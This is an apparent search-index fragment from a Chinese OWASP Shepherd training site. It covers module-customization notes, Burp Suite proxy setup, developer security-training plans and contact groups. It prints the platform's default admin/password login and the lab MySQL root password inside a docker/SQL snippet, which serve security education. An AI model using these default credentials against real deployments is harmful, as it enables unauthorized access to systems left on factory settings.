src/main/java/servlets/module/SolutionSubmit.java src/main/java/servlets/module/RefreshMenu.java \u6dfb\u52a0\u8f93\u51fa\u7f16\u7801\u4ee3\u7801 \u89e3\u51b3\u8fd4\u56de\u9875\u9762\u4e71\u7801\u95ee\u9898 response.setContentType(\"text/html;charset=utf-8\"); owasp Shepherd \u4e2d\u6587\u4e71\u7801issues \u53ea\u5f00\u653e\u524d\u4e24\u4e2a\u7b49\u7ea7\u7684web\u5b89\u5168\u6f0f\u6d1e \u5728\u6587\u4ef6 src/main/java/dbProcs/Getter.java \u5b9a\u4e49\u4e86\u6bcf\u4e2a\u7b49\u7ea7\u5bf9\u5e94\u7684rank\u503c,\u7b49\u7ea7\u8d8a\u9ad8\uff0crank\u503c\u8d8a\u9ad8 private static int fieldTrainingCap = 45; private static int privateCap = 80; private static int corporalCap = 105; private static int sergeantCap = 130; private static int lieutenantCap = 145; private static int majorCap = 175; private static int admiralCap = 999; \u8fd9\u4e2a\u503c\u5bf9\u5e94core\u6570\u636e\u5e93 modules \u8868\u7684 incrementalRank \u56e0\u6b64\u53ea\u9700\u8981\u7f16\u5199\u4e24\u6761SQL\u53ef\u4ee5\u5b9e\u73b0\u9700\u6c42 update modules set moduleStatus='closed' update modules set moduleStatus='open' where incrementalRank < 80 and moduleCategory not like '%Mobile%' \u5982\u679c\u4f60\u4f7f\u7528docker\u90e8\u7f72\u73af\u5883,\u76f4\u63a5\u8fde\u63a5docker\u5bb9\u5668 docker exec -it secshep_mysql /bin/bash mysql -uroot -p #mysql \u5bc6\u7801\u662f CowSaysMoo use core update modules set moduleStatus='closed' update modules set moduleStatus='open' where incrementalRank < 80 and moduleCategory not like '%Mobile%'","title":"\u4e8c\u6b21\u5f00\u53d1\u8bb0\u5f55"},{"location":"index.html#_16","text":"\u5bf9owasp shepherd\u5b8c\u6574\u5b66\u4e60\u8fc7\u7a0b\u8fdb\u884c\u8bb0\u5f55\uff0c\u5305\u62ec\u9898\u76ee\u7406\u89e3\u3001\u6e90\u4ee3\u7801\u89e3\u6790\u3001\u89e3\u9898\u8fc7\u7a0b\u3001\u4fee\u590d\u65b9\u6848\u7b49\u591a\u65b9\u9762\u5bf9\u4e00\u4e2a\u9898\u8fdb\u884c\u5b66\u4e60 \u901a\u8fc7\u5bf9v3.1(2018\u5e74\u7248\u672c),web\u6f0f\u6d1e\u76f8\u5173\u9898\u8fdb\u884c\u5b66\u4e60\uff0c\u603b\u4f53\u611f\u89c9\u8fd9\u5957\u7ec3\u4e60\u9898\u975e\u5e38\u4e0d\u9519\uff0c\u9002\u5408\u4e0d\u540c\u9700\u6c42\u3001\u4e0d\u540c\u77e5\u8bc6\u80cc\u666f\u7684\u7684\u5b89\u5168\u4ece\u4e1a\u8005 \u5176\u4e2d\u96be\u514d\u6709\u4e00\u4e9b\u96be\u4ee5\u7406\u89e3\u7684\u9898\uff0c\u4ece\u7b54\u6848\u6765\u8bf4\u4e5f\u6bd4\u8f83\u96be\u7406\u89e3\uff0c\u4e0d\u77e5\u9053\u4e00\u4e9b\u4fe1\u606f\u4ece\u54ea\u91cc\u800c\u6765.... \u4e3a\u4e86\u4fbf\u4e8e\u7406\u89e3\uff0c\u5c06\u505a\u8fc7\u7684\u9898\u90fd\u52a0\u5165\u5230\u5b66\u4e60\u6587\u6863\u4e2d, \u5e0c\u671b\u5bf9\u521d\u5b66\u8005\u6709\u6240\u5e2e\u52a9 \u5176\u4e2d\u6709\u51e0\u4e2a\u6ce8\u610f\u70b9: - CSRF \u6709\u5f88\u591a\u529f\u80fd\u9700\u8981\u53e6\u4e00\u4e2a\u8d26\u53f7\u914d\u5408\u624d\u80fd\u5b8c\u6210\uff0c\u56e0\u6b64\u6ca1\u6709\u505a\u5b8c - \u4e00\u4e9b\u96be\u4ee5\u7406\u89e3\u7684\u9898(\u770b\u5b8c\u63d0\u793a\u4ecd\u7136\u4e0d\u77e5\u9053\u600e\u4e48\u56de\u4e8b\u7684)\uff0c\u6ca1\u6709\u6574\u7406\u5b66\u4e60\u7b14\u8bb0 Session Management Challenge 8 Insecure Cryptographic Storage Challenge 4 Security Misconfig Cookie Flag Insecure Cryptographic Storage Home Made Keys graph LR A[Start] --> B{Error?}; B -->|Yes| C[Hmm...]; C --> D[Debug]; D --> B; B ---->|No| E[Yay!]; sequenceDiagram Alice->>John: Hello John, how are you? loop Healthcheck John->>John: Fight against hypochondria end Note right of John: Rational thoughts! John-->>Alice: Great! John->>Bob: How about you? Bob-->>John: Jolly good! stateDiagram-v2 [*] --> Active state Active { [*] --> NumLockOff NumLockOff --> NumLockOn : EvNumLockPressed NumLockOn --> NumLockOff : EvNumLockPressed -- [*] --> CapsLockOff CapsLockOff --> CapsLockOn : EvCapsLockPressed CapsLockOn --> CapsLockOff : EvCapsLockPressed -- [*] --> ScrollLockOff ScrollLockOff --> ScrollLockOn : EvScrollLockPressed ScrollLockOn --> ScrollLockOff : EvScrollLockPressed } classDiagram Person <|-- Student Person <|-- Professor Person : +String name Person : +String phoneNumber Person : +String emailAddress Person: +purchaseParkingPass() Address \"1\" <-- \"0..1\" Person:lives at class Student{ +int studentNumber +int averageMark +isEligibleToEnrol() +getSeminarsTaken() } class Professor{ +int salary } class Address{ +String street +String city +String state +int postalCode +String country -validate() +outputAsLabel() } erDiagram CUSTOMER ||--o{ ORDER : places ORDER ||--|{ LINE-ITEM : contains CUSTOMER }|..|{ DELIVERY-ADDRESS : uses graph TD; A-->B; A-->C; B-->D; C-->D;","title":"\u7b14\u8bb0"},{"location":"contact.html","text":"\u5b89\u5168\u7b14\u8bb0\u5de5\u4f5c\u5ba4\u8054\u7cfb\u65b9\u5f0f \u00b6 \u5fae\u4fe1\u4ea4\u6d41\u7fa4 \u00b6 \u7531\u4e8e\u5fae\u4fe1\u6ca1\u6709\u64a4\u56de\u3001\u7981\u8a00\u7b49\u529f\u80fd\uff0c\u4e3a\u4e86\u4fdd\u8bc1\u4ea4\u6d41\u8d28\u91cf \u8fd9\u662f\u4e00\u4e2a\u4ed8\u8d39\u4ea4\u6d41\u7fa4\uff0c\u5165\u7fa4\u9700\u8981\u652f\u4ed8 5 \u5143\u4eba\u6c11\u5e01 \u52a0\u5b98\u65b9\u5ba2\u670d\u5fae\u4fe1 \u652f\u4ed85\u5143,\u7b49\u5f85\u5ba2\u670d\u62c9\u5165\u7fa4 QQ\u4ea4\u6d41\u7fa4 \u00b6 \u7fa4\u53f7: 309614684","title":"\u8054\u7cfb\u6211\u4eec"},{"location":"contact.html#_1","text":"","title":"\u5b89\u5168\u7b14\u8bb0\u5de5\u4f5c\u5ba4\u8054\u7cfb\u65b9\u5f0f"},{"location":"contact.html#_2","text":"\u7531\u4e8e\u5fae\u4fe1\u6ca1\u6709\u64a4\u56de\u3001\u7981\u8a00\u7b49\u529f\u80fd\uff0c\u4e3a\u4e86\u4fdd\u8bc1\u4ea4\u6d41\u8d28\u91cf \u8fd9\u662f\u4e00\u4e2a\u4ed8\u8d39\u4ea4\u6d41\u7fa4\uff0c\u5165\u7fa4\u9700\u8981\u652f\u4ed8 5 \u5143\u4eba\u6c11\u5e01 \u52a0\u5b98\u65b9\u5ba2\u670d\u5fae\u4fe1 \u652f\u4ed85\u5143,\u7b49\u5f85\u5ba2\u670d\u62c9\u5165\u7fa4","title":"\u5fae\u4fe1\u4ea4\u6d41\u7fa4"},{"location":"contact.html#qq","text":"\u7fa4\u53f7: 309614684","title":"QQ\u4ea4\u6d41\u7fa4"},{"location":"enterprise_security_developer_taining.html","text":"\u4f01\u4e1a\u5185\u90e8\u9762\u5411\u7814\u53d1\u6d4b\u8bd5\u5b89\u5168\u57f9\u8bad \u00b6 \u4f01\u4e1a\u7814\u53d1\u6d4b\u8bd5\u5c97\u4e3a\u4ec0\u4e48\u9700\u8981\u5173\u6ce8\u5b89\u5168\u95ee\u9898? \u00b6 \u6210\u672c\u7684\u89d2\u5ea6 \u00b6 \u8d8a\u65e9\u89e3\u51b3\u6210\u672c\u8d8a\u4f4e \u5728\u4f01\u4e1a\u4e2d\u770b\u5230\u8fc7\u5f88\u5927\u4e00\u90e8\u5206\u5b89\u5168\u95ee\u9898\uff0c\u90fd\u662f\u57fa\u7840\u5b89\u5168\u95ee\u9898\uff0c\u5982SQL\u6ce8\u5165\u3001XSS\u3001\u547d\u4ee4\u6ce8\u5165\uff0c\u53ea\u9700\u8981\u7814\u53d1\u5728\u5f00\u53d1\u65f6\uff0c\u7a0d\u5fae\u5173\u6ce8\u63d0\u9ad8\u5b89\u5168\u610f\u8bc6\uff0c\u8fdb\u884c\u57fa\u7840\u8fc7\u6ee4\uff0c\u5c31\u53ef\u4ee5\u89e3\u51b3 \u4ece\u6210\u672c\u7684\u89d2\u5ea6\u6765\u8bf4\uff0c\u7814\u53d1\u65f6\u671f\u89e3\u51b3\u6389\u4e86\u5b89\u5168\u95ee\u9898\uff0c\u6210\u672c\u662f\u6700\u4f4e\u7684 \u89e3\u51b3\u95ee\u9898\u66f4\u5feb \u00b6 \u7814\u53d1\u66f4\u52a0\u719f\u6089\u4e1a\u52a1\uff0c\u80fd\u591f\u60f3\u5230\u66f4\u597d\u7684\u89e3\u51b3\u65b9\u6848 \u4e3a\u4ec0\u4e48\u9009\u62e9\u8fd9\u5957owasp shepherd\u8bfe\u7a0b ? \u00b6 \u65b9\u4fbf\u7ba1\u7406\u548c\u8ffd\u8e2a\u5b66\u4e60\u8fdb\u5ea6 \u6bcf\u4e2a\u4eba\u53ef\u7533\u8bf7\u552f\u4e00\u6807\u8bc6\uff0c\u7ba1\u7406\u5458\u53ef\u4ee5\u67e5\u770b\u5b66\u4e60\u8fdb\u5ea6 \u8bfe\u7a0b\u5206\u7ea7\u522b\u7c7b \u53ef\u4ee5\u6839\u636e\u53d7\u4f17\u8bbe\u7f6e\u4e0d\u540c\u7b49\u7ea7\u7684\u8bfe\u7a0b\uff0c\u6bd4\u5982\u7814\u53d1\u6d4b\u8bd5\u53ea\u9700\u8981\u5b66\u4e60\u524d\u4e24\u7c7b\u8bfe\u7a0b \u6301\u7eed\u66f4\u65b0 \u4f5c\u8005\u8fd8\u5728\u6301\u7eed\u5f00\u53d1\u8fd9\u5957\u8bfe\u7a0b\uff0c\u589e\u52a0\u6700\u65b0\u7684\u5b89\u5168\u6f0f\u6d1e \u5b8c\u5584\u7684\u8bfe\u7a0b\u6559\u7a0b owasp shepherd cn\u5df2\u7ecf\u5c06\u8be5\u8bfe\u7a0b\u8fdb\u884c\u4e86\u5168\u9762\u7684\u7814\u7a76\uff0c\u6574\u7406\u4e86\u4e00\u5957\u4eba\u4eba\u6613\u61c2\u7684\u89e3\u51b3\u65b9\u6848 \u5438\u5f15\u4f01\u4e1a\u4e2d\u7684\u7814\u53d1\u548c\u6d4b\u8bd5\u52a0\u5165\u8fdb\u6765 \u00b6 \u524d\u671f\u63a8\u5e7f \u9700\u8981\u79cd\u5b50\u7528\u6237\uff0c\u53ef\u4ee5\u627e\u8ba4\u8bc6\u7684\uff0c\u5bf9\u5b89\u5168\u611f\u5174\u8da3\u7684\u540c\u5b66\uff0c\u52a0\u5165\u8fdb\u6765\uff0c\u7ed9\u4e88\u7279\u5b9a\u5956\u52b1\uff0c\u6bd4\u5982\u90fd\u5b8c\u6210\u4e86\u8bfe\u7a0b\uff0c\u53ef\u4ee5\u514d\u8d39\u53c2\u52a0\u805a\u9910\uff0c\u5c0f\u7ec4\u805a\u9910\uff0c\u65b9\u4fbf\u4ea4\u6d41\u548c\u5927\u5bb6\u7ee7\u7eed\u63a2\u8ba8\u5b89\u5168\u5f00\u53d1\u76f8\u5173\u95ee\u9898 \u7b49\u5927\u90e8\u5206\u540c\u5b66\u90fd\u5b8c\u6210\u4e86\u8bfe\u7a0b \u53ef\u4ee5\u5f3a\u5236\u63a8\u5e7f\uff0c\u8981\u6c42\u672a\u5b8c\u6210\u7684\u540c\u5b66\u5728\u89c4\u5b9a\u7684\u65f6\u95f4\u5185\u5b8c\u6210\u8bfe\u7a0b\u5b66\u4e60\uff0c\u65b0\u4eba\u5165\u804c\u5f3a\u5236\u8981\u6c42\u8fdb\u884c\u5b66\u4e60","title":"\u4f01\u4e1a\u5185\u90e8\u9762\u5411\u7814\u53d1\u6d4b\u8bd5\u5b89\u5168\u57f9\u8bad"},{"location":"enterprise_security_developer_taining.html#_1","text":"","title":"\u4f01\u4e1a\u5185\u90e8\u9762\u5411\u7814\u53d1\u6d4b\u8bd5\u5b89\u5168\u57f9\u8bad"},{"location":"enterprise_security_developer_taining.html#_2","text":"","title":"\u4f01\u4e1a\u7814\u53d1\u6d4b\u8bd5\u5c97\u4e3a\u4ec0\u4e48\u9700\u8981\u5173\u6ce8\u5b89\u5168\u95ee\u9898?"},{"location":"enterprise_security_developer_taining.html#_3","text":"\u8d8a\u65e9\u89e3\u51b3\u6210\u672c\u8d8a\u4f4e \u5728\u4f01\u4e1a\u4e2d\u770b\u5230\u8fc7\u5f88\u5927\u4e00\u90e8\u5206\u5b89\u5168\u95ee\u9898\uff0c\u90fd\u662f\u57fa\u7840\u5b89\u5168\u95ee\u9898\uff0c\u5982SQL\u6ce8\u5165\u3001XSS\u3001\u547d\u4ee4\u6ce8\u5165\uff0c\u53ea\u9700\u8981\u7814\u53d1\u5728\u5f00\u53d1\u65f6\uff0c\u7a0d\u5fae\u5173\u6ce8\u63d0\u9ad8\u5b89\u5168\u610f\u8bc6\uff0c\u8fdb\u884c\u57fa\u7840\u8fc7\u6ee4\uff0c\u5c31\u53ef\u4ee5\u89e3\u51b3 \u4ece\u6210\u672c\u7684\u89d2\u5ea6\u6765\u8bf4\uff0c\u7814\u53d1\u65f6\u671f\u89e3\u51b3\u6389\u4e86\u5b89\u5168\u95ee\u9898\uff0c\u6210\u672c\u662f\u6700\u4f4e\u7684","title":"\u6210\u672c\u7684\u89d2\u5ea6"},{"location":"enterprise_security_developer_taining.html#_4","text":"\u7814\u53d1\u66f4\u52a0\u719f\u6089\u4e1a\u52a1\uff0c\u80fd\u591f\u60f3\u5230\u66f4\u597d\u7684\u89e3\u51b3\u65b9\u6848","title":"\u89e3\u51b3\u95ee\u9898\u66f4\u5feb"},{"location":"enterprise_security_developer_taining.html#owasp-shepherd","text":"\u65b9\u4fbf\u7ba1\u7406\u548c\u8ffd\u8e2a\u5b66\u4e60\u8fdb\u5ea6 \u6bcf\u4e2a\u4eba\u53ef\u7533\u8bf7\u552f\u4e00\u6807\u8bc6\uff0c\u7ba1\u7406\u5458\u53ef\u4ee5\u67e5\u770b\u5b66\u4e60\u8fdb\u5ea6 \u8bfe\u7a0b\u5206\u7ea7\u522b\u7c7b \u53ef\u4ee5\u6839\u636e\u53d7\u4f17\u8bbe\u7f6e\u4e0d\u540c\u7b49\u7ea7\u7684\u8bfe\u7a0b\uff0c\u6bd4\u5982\u7814\u53d1\u6d4b\u8bd5\u53ea\u9700\u8981\u5b66\u4e60\u524d\u4e24\u7c7b\u8bfe\u7a0b \u6301\u7eed\u66f4\u65b0 \u4f5c\u8005\u8fd8\u5728\u6301\u7eed\u5f00\u53d1\u8fd9\u5957\u8bfe\u7a0b\uff0c\u589e\u52a0\u6700\u65b0\u7684\u5b89\u5168\u6f0f\u6d1e \u5b8c\u5584\u7684\u8bfe\u7a0b\u6559\u7a0b owasp shepherd cn\u5df2\u7ecf\u5c06\u8be5\u8bfe\u7a0b\u8fdb\u884c\u4e86\u5168\u9762\u7684\u7814\u7a76\uff0c\u6574\u7406\u4e86\u4e00\u5957\u4eba\u4eba\u6613\u61c2\u7684\u89e3\u51b3\u65b9\u6848","title":"\u4e3a\u4ec0\u4e48\u9009\u62e9\u8fd9\u5957owasp shepherd\u8bfe\u7a0b ?"},{"location":"enterprise_security_developer_taining.html#_5","text":"\u524d\u671f\u63a8\u5e7f \u9700\u8981\u79cd\u5b50\u7528\u6237\uff0c\u53ef\u4ee5\u627e\u8ba4\u8bc6\u7684\uff0c\u5bf9\u5b89\u5168\u611f\u5174\u8da3\u7684\u540c\u5b66\uff0c\u52a0\u5165\u8fdb\u6765\uff0c\u7ed9\u4e88\u7279\u5b9a\u5956\u52b1\uff0c\u6bd4\u5982\u90fd\u5b8c\u6210\u4e86\u8bfe\u7a0b\uff0c\u53ef\u4ee5\u514d\u8d39\u53c2\u52a0\u805a\u9910\uff0c\u5c0f\u7ec4\u805a\u9910\uff0c\u65b9\u4fbf\u4ea4\u6d41\u548c\u5927\u5bb6\u7ee7\u7eed\u63a2\u8ba8\u5b89\u5168\u5f00\u53d1\u76f8\u5173\u95ee\u9898 \u7b49\u5927\u90e8\u5206\u540c\u5b66\u90fd\u5b8c\u6210\u4e86\u8bfe\u7a0b \u53ef\u4ee5\u5f3a\u5236\u63a8\u5e7f\uff0c\u8981\u6c42\u672a\u5b8c\u6210\u7684\u540c\u5b66\u5728\u89c4\u5b9a\u7684\u65f6\u95f4\u5185\u5b8c\u6210\u8bfe\u7a0b\u5b66\u4e60\uff0c\u65b0\u4eba\u5165\u804c\u5f3a\u5236\u8981\u6c42\u8fdb\u884c\u5b66\u4e60","title":"\u5438\u5f15\u4f01\u4e1a\u4e2d\u7684\u7814\u53d1\u548c\u6d4b\u8bd5\u52a0\u5165\u8fdb\u6765"},{"location":"http_proxy.html","text":"OWASP shepherd CN \u5b66\u524d\u57fa\u7840\u77e5\u8bc6 \u00b6 \u6d4b\u8bd5\u8fc7\u7a0b\u4e2d\uff0c\u9700\u8981\u5bf9\u6d4f\u89c8\u5668\u53d1\u9001\u7684HTTP\u8bf7\u6c42\u8fdb\u884c\u62e6\u622a\u3001\u4fee\u6539\u3001\u91cd\u653e\uff0c\u9700\u8981\u4e00\u4e2aHTTP\u4ee3\u7406\u5de5\u5177 \u4efb\u4f55\u4e00\u6b3eHTTP\u4ee3\u7406\u5de5\u5177\u90fd\u53ef\u4ee5 \u5982\u679c\u4f60\u6ca1\u6709\u4f7f\u7528\u8fc7\u7c7b\u4f3c\u5de5\u5177\uff0c\u6211\u4eec\u63a8\u8350\u4f60\u4f7f\u7528burp suite \u8fd9\u4e2a\u4ee3\u7406\u8f6f\u4ef6 http\u4ee3\u7406\u5de5\u5177(burp)\u4f7f\u7528 \u00b6 \u4ecb\u7ecd \u00b6 \u662f\u4e00\u4e2aHTTP\u4ee3\u7406\u5de5\u5177 \u53ef\u4ee5\u62e6\u622a\u6d4f\u89c8\u5668\u53d1\u51fa\u7684\u5b8c\u6574HTTP\u8bf7\u6c42\u5305 \u53ef\u4ee5\u5bf9HTTP\u8bf7\u6c42\u5305\u8fdb\u884c\u4efb\u610f\u4fee\u6539 \u53ef\u4ee5\u91cd\u65b0\u53d1\u9001\u8bf7\u6c42\u5305\u5230\u670d\u52a1\u5668 \u5b89\u88c5 \u00b6 Burp Suite Releases \u793e\u533a\u7248\u4e0b\u8f7d\u5730\u5740 \u4e0b\u8f7d\u540e\u76f4\u63a5\u53cc\u51fb\u6309\u7167\u63d0\u793a\u5b89\u88c5\u5373\u53ef \u8bbe\u7f6e \u00b6 burp suite\u8bbe\u7f6e \u786e\u8ba4\u4ee3\u7406\u76d1\u542c\u7684\u7aef\u53e3\uff0c\u9ed8\u8ba4\u662f(127.0.0.1:8080) \u6d4f\u89c8\u5668\u914d\u7f6e \u4ee5firefox\u4e3a\u4f8b 1.\u5728\u6d4f\u89c8\u5668\u5730\u5740\u680f\u8f93\u5165 about:preferences \u6253\u5f00\u914d\u7f6e\u754c\u9762 2.\u5728\u6700\u4e0b\u65b9\u627e\u5230 \u7f51\u7edc\u8bbe\u7f6e \u9009\u9879\uff0c\u70b9\u51fb \u8bbe\u7f6e \u6309\u94ae 3.\u624b\u52a8\u914d\u7f6e\u4ee3\u7406 \u586b\u5199\u672c\u5730IP(127.0.0.1)\u548c\u7aef\u53e3(8080),\u52fe\u9009\u5c06\u6b64\u4ee3\u7406\u7528\u6237HTTPS,\u5982\u4e0b\u56fe\u6240\u793a \u529f\u80fd\u4ecb\u7ecd \u00b6 burp\u6709\u5f88\u591a\u529f\u80fd\uff0c\u672c\u8bfe\u7a0b\u4e3b\u8981\u4ee3\u7406\u529f\u80fd\u548c\u7f16/\u89e3\u7801\u529f\u80fd\u5373\u53ef\uff0c\u5176\u4ed6\u529f\u80fd\u53ef\u4ee5\u53c2\u8003 burp \u5b98\u65b9\u6587\u6863 \u4ee3\u7406\u529f\u80fd \u00b6 \u62e6\u622a\u6d4f\u89c8\u5668\u8bf7\u6c42 \u70b9\u51fb burp\u5de5\u5177\u7684 Proxy->intercept->intercept is off \u4f7f\u7528\u6d4f\u89c8\u5668\u53d1\u9001http\u8bf7\u6c42\uff0c\u5728burp\u4e0a\u8fdb\u884c\u62e6\u622a\u8bf7\u6c42 \u6548\u679c\u5982\u4e0b *\u5728\u8be5\u9875\u9762\u53ef\u4ee5\u5bf9\u8bf7\u6c42\u5185\u5bb9\u8fdb\u884c\u4fee\u6539 * \u7136\u540e\u70b9\u51fb Forward \u6309\u94ae\uff0c\u5373\u53ef\u5c06\u8bf7\u6c42\u53d1\u9001\u5230\u670d\u52a1\u7aef \u7f16\u7801\u548c\u89e3\u7801\u529f\u80fd \u00b6 burp \u7684Decoder\u529f\u80fd\uff0c\u53ef\u4ee5\u8fdb\u884c\u57fa\u672c\u7684\u7f16\u7801\u64cd\u4f5c OWASP shepherd\u57fa\u7840\u77e5\u8bc6 \u00b6 \u7cfb\u7edf\u9ed8\u8ba4\u7684\u7ba1\u7406\u5458\u8d26\u53f7\u548c\u5bc6\u7801\u662fadmin/password \u6bcf\u4e2a\u9898\u505a\u5b8c\u90fd\u4f1a\u83b7\u5f97\u4e00\u4e2a\u901a\u5173\u5bc6\u94a5,\u9700\u8981\u63d0\u4ea4\u5230\u9898\u6700\u4e0a\u9762\u7684\u8f93\u5165\u6846\u4e2d \u53ea\u6709\u505a\u5b8c\u5f53\u524d\u9898, \u624d\u5141\u8bb8\u505a\u4e0b\u4e00\u4e2a\u9898","title":"\u5b66\u524d\u57fa\u7840\u77e5\u8bc6"},{"location":"http_proxy.html#owasp-shepherd-cn","text":"\u6d4b\u8bd5\u8fc7\u7a0b\u4e2d\uff0c\u9700\u8981\u5bf9\u6d4f\u89c8\u5668\u53d1\u9001\u7684HTTP\u8bf7\u6c42\u8fdb\u884c\u62e6\u622a\u3001\u4fee\u6539\u3001\u91cd\u653e\uff0c\u9700\u8981\u4e00\u4e2aHTTP\u4ee3\u7406\u5de5\u5177 \u4efb\u4f55\u4e00\u6b3eHTTP\u4ee3\u7406\u5de5\u5177\u90fd\u53ef\u4ee5 \u5982\u679c\u4f60\u6ca1\u6709\u4f7f\u7528\u8fc7\u7c7b\u4f3c\u5de5\u5177\uff0c\u6211\u4eec\u63a8\u8350\u4f60\u4f7f\u7528burp suite \u8fd9\u4e2a\u4ee3\u7406\u8f6f\u4ef6","title":"OWASP shepherd CN \u5b66\u524d\u57fa\u7840\u77e5\u8bc6"},{"location":"http_proxy.html#httpburp","text":"","title":"http\u4ee3\u7406\u5de5\u5177(burp)\u4f7f\u7528"},{"location":"http_proxy.html#_1","text":"\u662f\u4e00\u4e2aHTTP\u4ee3\u7406\u5de5\u5177 \u53ef\u4ee5\u62e6\u622a\u6d4f\u89c8\u5668\u53d1\u51fa\u7684\u5b8c\u6574HTTP\u8bf7\u6c42\u5305 \u53ef\u4ee5\u5bf9HTTP\u8bf7\u6c42\u5305\u8fdb\u884c\u4efb\u610f\u4fee\u6539 \u53ef\u4ee5\u91cd\u65b0\u53d1\u9001\u8bf7\u6c42\u5305\u5230\u670d\u52a1\u5668","title":"\u4ecb\u7ecd"},{"location":"http_proxy.html#_2","text":"Burp Suite Releases \u793e\u533a\u7248\u4e0b\u8f7d\u5730\u5740 \u4e0b\u8f7d\u540e\u76f4\u63a5\u53cc\u51fb\u6309\u7167\u63d0\u793a\u5b89\u88c5\u5373\u53ef","title":"\u5b89\u88c5"},{"location":"http_proxy.html#_3","text":"burp suite\u8bbe\u7f6e \u786e\u8ba4\u4ee3\u7406\u76d1\u542c\u7684\u7aef\u53e3\uff0c\u9ed8\u8ba4\u662f(127.0.0.1:8080) \u6d4f\u89c8\u5668\u914d\u7f6e \u4ee5firefox\u4e3a\u4f8b 1.\u5728\u6d4f\u89c8\u5668\u5730\u5740\u680f\u8f93\u5165 about:preferences \u6253\u5f00\u914d\u7f6e\u754c\u9762 2.\u5728\u6700\u4e0b\u65b9\u627e\u5230 \u7f51\u7edc\u8bbe\u7f6e \u9009\u9879\uff0c\u70b9\u51fb \u8bbe\u7f6e \u6309\u94ae 3.\u624b\u52a8\u914d\u7f6e\u4ee3\u7406 \u586b\u5199\u672c\u5730IP(127.0.0.1)\u548c\u7aef\u53e3(8080),\u52fe\u9009\u5c06\u6b64\u4ee3\u7406\u7528\u6237HTTPS,\u5982\u4e0b\u56fe\u6240\u793a","title":"\u8bbe\u7f6e"},{"location":"http_proxy.html#_4","text":"burp\u6709\u5f88\u591a\u529f\u80fd\uff0c\u672c\u8bfe\u7a0b\u4e3b\u8981\u4ee3\u7406\u529f\u80fd\u548c\u7f16/\u89e3\u7801\u529f\u80fd\u5373\u53ef\uff0c\u5176\u4ed6\u529f\u80fd\u53ef\u4ee5\u53c2\u8003 burp \u5b98\u65b9\u6587\u6863","title":"\u529f\u80fd\u4ecb\u7ecd"},{"location":"http_proxy.html#_5","text":"\u62e6\u622a\u6d4f\u89c8\u5668\u8bf7\u6c42 \u70b9\u51fb burp\u5de5\u5177\u7684 Proxy->intercept->intercept is off \u4f7f\u7528\u6d4f\u89c8\u5668\u53d1\u9001http\u8bf7\u6c42\uff0c\u5728burp\u4e0a\u8fdb\u884c\u62e6\u622a\u8bf7\u6c42 \u6548\u679c\u5982\u4e0b *\u5728\u8be5\u9875\u9762\u53ef\u4ee5\u5bf9\u8bf7\u6c42\u5185\u5bb9\u8fdb\u884c\u4fee\u6539 * \u7136\u540e\u70b9\u51fb Forward \u6309\u94ae\uff0c\u5373\u53ef\u5c06\u8bf7\u6c42\u53d1\u9001\u5230\u670d\u52a1\u7aef","title":"\u4ee3\u7406\u529f\u80fd"},{"location":"http_proxy.html#_6","text":"burp \u7684Decoder\u529f\u80fd\uff0c\u53ef\u4ee5\u8fdb\u884c\u57fa\u672c\u7684\u7f16\u7801\u64cd\u4f5c","title":"\u7f16\u7801\u548c\u89e3\u7801\u529f\u80fd"},{"location":"http_proxy.html#owasp-shepherd","text":"\u7cfb\u7edf\u9ed8\u8ba4\u7684\u7ba1\u7406\u5458\u8d26\u53f7\u548c\u5bc6\u7801\u662fadmin/password \u6bcf\u4e2a\u9898\u505a\u5b8c\u90fd\u4f1a\u83b7\u5f97\u4e00\u4e2a\u901a\u5173\u5bc6\u94a5,\u9700\u8981\u63d0\u4ea4\u5230\u9898\u6700\u4e0a\u9762\u7684\u8f93\u5165\u6846\u4e2d \u53ea\u6709\u505a\u5b8c\u5f53\u524d\u9898, \u624d\u5141\u8bb8\u505a\u4e0b\u4e00\u4e2a\u9898","title":"OWASP shepherd\u57fa\u7840\u77e5\u8bc6"},{"location":"security_develop_taining.html","text":"","title":"Security develop taining"},{"location":"security_qa.html","text":"\u57fa\u7840\u5b89\u5168\u6d4b\u8bd5 - owasp shepherd CN\u9879\u76ee \u00b6 \u4f5c\u4e3a\u5f00\u53d1\u548c\u6d4b\u8bd5\u4eba\u5458,\u5982\u679c\u60f3\u6784\u5efa\u5b89\u5168\u7684\u7cfb\u7edf\uff0c\u9996\u5148\u9700\u8981\u5728\u5b9e\u9645web\u9879\u76ee\u80fd\u591f\u4e2d\u67e5\u627e\u5230\u5bf9\u5e94\u6f0f\u6d1e\uff0c\u8fdb\u4e00\u6b65\u52a0\u6df1\u5bf9\u6f0f\u6d1e\u7684\u7406\u89e3\u3002 owasp shepherd CN \u9879\u76ee\u5c31\u662f\u4e00\u5957\u96c6\u5408\u4e86\u5e38\u89c1\u5b89\u5168\u6f0f\u6d1e\u7684web\u7cfb\u7edf\uff0c\u5e0c\u671b\u7ed3\u5408\u771f\u5b9e\u5b58\u5728\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u8ba9\u5f00\u53d1\u548c\u6d4b\u8bd5\u540c\u5b66\u63d0\u9ad8\u5b89\u5168\u610f\u8bc6\uff0c\u8fdb\u800c\u6253\u9020\u5b89\u5168\u7cfb\u7edf owasp shepherd CN \u662f\u4e00\u5957\u96c6\u6210\u4e86\u5e38\u89c1web\u6f0f\u6d1e\u7684\u7cfb\u7edf\uff0c\u6bcf\u4e2a\u9875\u9762\u662f\u5bf9\u5e94\u4e00\u4e2a\u5b89\u5168\u6f0f\u6d1e\uff0c\u5305\u62ec\u5b89\u5168\u6f0f\u6d1e\u7684\u4ecb\u7ecd\uff0c\u7528\u6237\u9700\u8981\u6839\u636e\u63d0\u793a\u4fe1\u606f\u5229\u7528\u6f0f\u6d1e\uff0c\u627e\u5230\u901a\u5173\u5bc6\u94a5, \u63d0\u4ea4\u5230\u7cfb\u7edf\uff0c\u5982\u679c\u63d0\u4ea4\u6b63\u786e\uff0c\u8868\u793a\u5bf9\u8be5\u6f0f\u6d1e\u5df2\u7ecf\u5b8c\u6574\u638c\u63e1\uff0c\u7136\u540e\u8fdb\u5165\u5230\u4e0b\u4e00\u4e2a\u9875\u9762/\u6f0f\u6d1e\u77e5\u8bc6\u70b9\u3002 \u9879\u76ee\u4ecb\u7ecd \u00b6 owasp shepherd CN \u662fowasp shepherd \u9879\u76ee\u7684\u4e2d\u6587\u7248\u672c, \u81f4\u529b\u4e8e\u5e2e\u52a9\u7814\u53d1\u548c\u6d4b\u8bd5\u540c\u5b66\u63d0\u9ad8web\u5b89\u5168\u610f\u8bc6, \u5f00\u53d1\u5b89\u5168\u7684web\u7cfb\u7edf 